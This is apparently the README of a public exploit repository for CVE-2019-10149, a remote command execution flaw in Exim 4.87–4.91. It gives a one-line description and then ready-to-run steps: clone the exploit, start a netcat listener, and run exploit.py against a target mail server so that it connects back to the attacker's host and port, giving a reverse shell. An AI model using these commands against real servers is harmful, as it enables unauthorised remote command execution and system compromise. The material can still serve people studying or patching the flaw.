# CVE-2019-10149
CVE-2019-10149 : A flaw was found in Exim versions 4.87 to 4.91 (inclusive). Improper validation of recipient address in deliver_message() function in /src/deliver.c may lead to remote command execution.

### Example
```
git clone https://github.com/Diefunction/CVE-2019-10149.git
nc -lvp 9000
python ./CVE-2019-10149/exploit.py --rhost example.com --rport 25 --lhost 10.10.10.100 --lport 9000
```

### About

HTB: https://www.hackthebox.eu/home/users/profile/47396 | https://www.hackthebox.eu/profile/47396 <br />
Twitter: @diefunction <br />
Discord: Diefunction#1337
